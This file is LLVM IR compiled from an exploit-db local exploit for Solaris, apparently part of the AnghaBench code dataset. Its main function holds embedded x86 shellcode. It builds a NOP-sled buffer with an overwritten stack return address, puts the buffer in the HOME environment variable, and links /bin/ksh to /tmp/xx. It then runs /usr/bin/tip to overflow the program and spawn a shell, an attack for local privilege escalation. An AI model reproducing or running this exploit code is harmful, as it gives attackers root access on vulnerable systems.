; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20684.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20684.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [109 x i8] c"\EB\0A\9A\01\02\03\\\07\04\C3\EB\05\E8\F9\FF\FF\FF^)\C0\88F\F7\89F\F2P\B0\8D\E8\E0\FF\FF\FFj\05\90\B0\17\E8\D6\FF\FF\FF\EB\1F^\8D\1E\89^\0B)\C0\88F\19\89F\14\89F\0F\89F\07\B0;\8DN\0BQQSP\EB\18\E8\DC\FF\FF\FF/tmp/xx\01\01\01\01\02\02\02\02\03\03\03\03\9A\04\04\04\04\07\04\00", align 16
@.str = private unnamed_addr constant [9 x i8] c"/bin/ksh\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"/tmp/xx\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"HOME=\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"/usr/bin/tip 5\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [109 x i8], align 16
  %6 = alloca i64, align 8
  %7 = alloca [600 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %8 = bitcast [109 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %8, i8* align 16 getelementptr inbounds ([109 x i8], [109 x i8]* @__const.main.shell, i32 0, i32 0), i64 109, i1 false)
  %9 = call i32 (...) @get_esp()
  %10 = add nsw i32 %9, 80
  %11 = sext i32 %10 to i64
  store i64 %11, i64* %6, align 8
  %12 = call i32 @symlink(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %13 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i32 144, i32 600)
  %15 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 599
  store i8 0, i8* %15, align 1
  %16 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 0
  %17 = getelementptr inbounds [109 x i8], [109 x i8]* %5, i64 0, i64 0
  %18 = call i32 @strlen(i8* %17)
  %19 = sext i32 %18 to i64
  %20 = sub i64 600, %19
  %21 = getelementptr inbounds i8, i8* %16, i64 %20
  %22 = getelementptr inbounds [109 x i8], [109 x i8]* %5, i64 0, i64 0
  %23 = getelementptr inbounds [109 x i8], [109 x i8]* %5, i64 0, i64 0
  %24 = call i32 @strlen(i8* %23)
  %25 = call i32 (i8*, ...) @memcpy(i8* %21, i8* %22, i32 %24)
  %26 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 0
  %27 = call i32 (i8*, ...) @memcpy(i8* %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 5)
  %28 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 0
  %29 = getelementptr inbounds i8, i8* %28, i64 265
  %30 = call i32 (i8*, ...) @memcpy(i8* %29, i64* %6, i32 4)
  %31 = getelementptr inbounds [600 x i8], [600 x i8]* %7, i64 0, i64 0
  %32 = call i32 @putenv(i8* %31)
  %33 = call i32 @system(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i32 @unlink(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @get_esp(...) #2

declare dso_local i32 @symlink(i8*, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @unlink(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
